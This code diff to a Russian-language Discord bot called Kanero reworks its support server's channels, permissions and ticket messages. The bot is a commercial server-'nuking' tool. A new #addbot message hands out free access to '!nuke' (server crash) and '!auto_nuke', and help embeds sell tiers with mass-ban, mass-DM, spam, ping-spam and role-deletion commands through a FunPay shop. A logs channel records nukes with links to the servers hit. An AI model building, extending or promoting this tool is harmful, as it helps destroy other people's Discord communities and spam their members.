@@ -2902,7 +2902,7 @@ async def setup(ctx):
         if role_user:   ow[role_user]   = _ow()
         if role_white:  ow[role_white]  = _ow()
         if role_premium:ow[role_premium]= _ow()
-        if role_tester: ow[role_tester] = _ow(True, True)
+        if role_tester: ow[role_tester] = _ow(True, True)  # Только тестеры
         if role_owner:  ow[role_owner]  = _ow(True, True)
         if role_dev:    ow[role_dev]    = _ow(True, True)
         return ow
@@ -2913,7 +2913,7 @@ async def setup(ctx):
         if role_user:   ow[role_user]   = _ow()
         if role_white:  ow[role_white]  = _ow()
         if role_premium:ow[role_premium]= _ow()
-        if role_tester: ow[role_tester] = _ow(True, False)
+        if role_tester: ow[role_tester] = _ow(True, False)  # Только тестеры (только чтение)
         if role_owner:  ow[role_owner]  = _ow(True, True)
         if role_dev:    ow[role_dev]    = _ow(True, True)
         return ow
@@ -3043,7 +3043,10 @@ async def setup(ctx):
         await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
     await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites=voice_premium_ow())
 
-    # 🔧 ━━ ADMIN — только Owner+ 🔧
+    # 🎫 ━━ ТИКЕТЫ — для всех пользователей 🎫
+    cat_tickets = await guild.create_category("━━━━ 🎫 ТИКЕТЫ ━━━━", overwrites=admin_ow())
+
+    # 🔧 ━━ ADMIN — только Owner, Developer, Moderator 🔧
     cat_admin = await guild.create_category("━━━━ 🔧 ADMIN ━━━━", overwrites=admin_ow())
     
     def admin_chat_ow():
@@ -3053,16 +3056,16 @@ async def setup(ctx):
         if role_white:  ow[role_white]  = _ow()
         if role_premium:ow[role_premium]= _ow()
         if role_friend: ow[role_friend] = _ow()
-        if role_tester: ow[role_tester] = _ow(True, True)  # Тестеры могут читать и писать
+        if role_tester: ow[role_tester] = _ow()  # Тестеры НЕ имеют доступа к админ-чату
         if role_mod:    ow[role_mod]    = _ow(True, True)  # Модераторы могут читать и писать
         if role_owner:  ow[role_owner]  = _ow(True, True)
         if role_dev:    ow[role_dev]    = _ow(True, True)
         return ow
     
-    # Порядок: admin-chat → logs → выдача-листа
-    await guild.create_text_channel("🔧・admin-chat", category=cat_admin, overwrites=admin_chat_ow(), topic="Чат для Owner, Developer, Moderator и Tester")
+    # Порядок: admin-chat → logs → лог-листа
+    await guild.create_text_channel("🔧・admin-chat", category=cat_admin, overwrites=admin_chat_ow(), topic="Чат для Owner, Developer и Moderator")
     logs_ch = await guild.create_text_channel("📊・logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков с !nukelogs и ссылками на серверы")
-    await guild.create_text_channel("📝・выдача-листа", category=cat_admin, overwrites=admin_ow(), topic="Логи выдачи подписок и компенсаций")
+    await guild.create_text_channel("📝・лог-листа", category=cat_admin, overwrites=admin_ow(), topic="Логи выдачи подписок и компенсаций")
     await guild.create_voice_channel("👑 admin-voice", category=cat_admin, overwrites=voice_admin_ow())
 
     # -- 5. Правила и инфо --
@@ -3187,26 +3190,48 @@ async def setup(ctx):
     a.add_field(name="✅ White", value="`!nuke [канал]` • `!stop` • `!cleanup`\n`!rename` • `!nicks_all` • `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
     a.add_field(name="💎 Premium", value="`!super_nuke` • `!massban` • `!massdm`\n`!spam` • `!pingspam` • `!rolesdelete`\n`!auto_super_nuke` • `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
     a.set_footer(text="☠️ Kanero  |  Лучший нюкер для-бота")
-    # Не отправляем в #addbot - только удаляем сообщения там
+    
+    # Отправляем постоянное сообщение в #addbot с инструкцией
+    await addbot_ch.send(embed=discord.Embed(
+        title="🤖 Получение доступа к боту Kanero",
+        description=(
+            "**Как получить бесплатный доступ (Freelist):**\n\n"
+            "1️⃣ Напиши **любое сообщение** в этот канал\n"
+            "2️⃣ Бот автоматически выдаст тебе роль **👥 User**\n"
+            "3️⃣ Получишь доступ к командам:\n"
+            "   • `!nuke` — краш сервера\n"
+            "   • `!auto_nuke on/off` — авто-краш при входе бота\n"
+            "   • `!help` — список всех команд\n"
+            "   • `!changelog` — история обновлений\n\n"
+            "4️⃣ Инструкция будет отправлена в **личные сообщения**\n\n"
+            "**💎 Хочешь больше возможностей?**\n"
+            "✅ **White** — расширенные команды\n"
+            "💎 **Premium** — максимальная мощь\n\n"
+            "Покупка: **davaidkatt** | **@Firisotik**\n"
+            "FunPay: https://funpay.com/users/16928925/\n\n"
+            "📨 Просто напиши что-то в этот канал и получи доступ!"
+        ),
+        color=0x0a0a0a
+    ).set_footer(text="🤖 Kanero  |  Бесплатный доступ для всех"))
 
     # Кнопка с созданием тикета в create-ticket
     ticket_embed = discord.Embed(
         title="🎫 Поддержка в Kanero",
         description=(
-            "Нужна помощь❌ Есть вопрос❌\n\n"
+            "Нужна помощь? Есть вопрос?\n\n"
             "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
             "• Вопросы по боту\n"
             "• Покупка White / Premium\n"
             "• Помощь с настройками\n\n"
             "**🛡️ Команда поддержки:**\n"
             "👑 Owner • 🔧 Developer • 🛡️ Moderator • 🧪 Tester\n\n"
-            "**🔗 Хочу Discord сервер с поддержкой❌**\n"
+            "**🔗 Хочу Discord сервер с поддержкой?**\n"
             "Если у тебя есть **свой сервер** на каком-либо Discord сервере с поддержкой (типа краша), напиши нам!\n"
             "Возможность стать нашим **партнёром сервером** с ролью 🤝"
         ),
         color=0x0a0a0a
     )
-    ticket_embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
+    ticket_embed.set_footer(text="☠️ Kanero  |  Мы всегда поможем")
     await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
 
     await logs_ch.send(embed=discord.Embed(
@@ -3635,13 +3660,13 @@ async def setup_update(ctx):
                     "• Помощь с настройками\n\n"
                     "**🛡️ Команда поддержки:**\n"
                     "👑 Owner • 🔧 Developer • 🛡️ Moderator • 🧪 Tester\n\n"
-                    "**🔗 Хочу Discord сервер с поддержкой❌**\n"
+                    "**🔗 Хочу Discord сервер с поддержкой?**\n"
                     "Если у тебя есть **свой сервер** на каком-либо Discord сервере с поддержкой (типа краша), напиши нам!\n"
                     "Возможность стать нашим **партнёром сервером** с ролью 🤝"
                 ),
                 color=0x0a0a0a
             )
-            ticket_embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
+            ticket_embed.set_footer(text="☠️ Kanero  |  Мы всегда поможем")
             
             if existing_message:
                 # Обновляем существующее сообщение
@@ -4274,8 +4299,8 @@ class TicketOpenView(discord.ui.View):
                 return
             open_tickets.pop(user.id, None)
 
-        # Ищем или создаём категорию тикетов
-        category = discord.utils.find(lambda c: TICKET_CATEGORY_NAME in c.name, guild.categories)
+        # Ищем категорию ТИКЕТЫ
+        category = discord.utils.find(lambda c: "ТИКЕТЫ" in c.name, guild.categories)
         if not category:
             # Создаём категорию с правами для администрации
             cat_overwrites = {
@@ -4283,10 +4308,10 @@ class TicketOpenView(discord.ui.View):
             }
             # Добавляем права для ролей поддержки
             for r in guild.roles:
-                if r.name in ("👑 Owner", "🔧 Developer", Kanero, "🛡️ Moderator", "🧪 Tester"):
+                if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero", "🛡️ Moderator", "🧪 Tester"):
                     cat_overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
             
-            category = await guild.create_category(TICKET_CATEGORY_NAME, overwrites=cat_overwrites)
+            category = await guild.create_category("━━━━ 🎫 ТИКЕТЫ ━━━━", overwrites=cat_overwrites)
 
         overwrites = {
             guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -4294,7 +4319,7 @@ class TicketOpenView(discord.ui.View):
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True),
         }
         for r in guild.roles:
-            if r.name in ("👑 Owner", "🔧 Developer", Kanero, "🛡️ Moderator", "🧪 Tester"):
+            if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero", "🛡️ Moderator", "🧪 Tester"):
                 overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
 
         ticket_ch = await guild.create_text_channel(
@@ -4327,7 +4352,7 @@ async def ticket_setup(ctx):
     embed = discord.Embed(
         title="🎫 Поддержка в Kanero",
         description=(
-            "Нужна помощь❌ Есть вопрос❌\n\n"
+            "Нужна помощь? Есть вопрос?\n\n"
             "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
             "• Вопросы по боту\n"
             "• Покупка White / Premium\n"
@@ -4337,7 +4362,7 @@ async def ticket_setup(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
+    embed.set_footer(text="☠️ Kanero  |  Мы всегда поможем")
     await ctx.send(embed=embed, view=TicketOpenView())
     try:
         await ctx.message.delete()
@@ -6138,30 +6163,6 @@ async def on_message(message):
             return
         
         uid = message.author.id
-        
-        # Отправляем сообщение в канал с инструкцией
-        try:
-            channel_msg = await message.channel.send(
-                embed=discord.Embed(
-                    title="🤖 Получение доступа к боту",
-                    description=(
-                        f"{message.author.mention}, напиши **любое сообщение** в этот канал и получи:\n\n"
-                        "✅ **Freelist подписку**\n"
-                        "✅ Роль **👥 User**\n"
-                        "✅ Доступ к командам `!nuke` и `!auto_nuke`\n\n"
-                        "📨 Инструкция будет отправлена в ЛС"
-                    ),
-                    color=0x0a0a0a
-                ).set_footer(text="🤖 Kanero  |  Для White/Premium пиши: davaidkatt")
-            )
-            # Удаляем сообщение через 10 секунд
-            await asyncio.sleep(10)
-            try:
-                await channel_msg.delete()
-            except Exception:
-                pass
-        except Exception:
-            pass
         
         if uid in FREELIST:
             try:
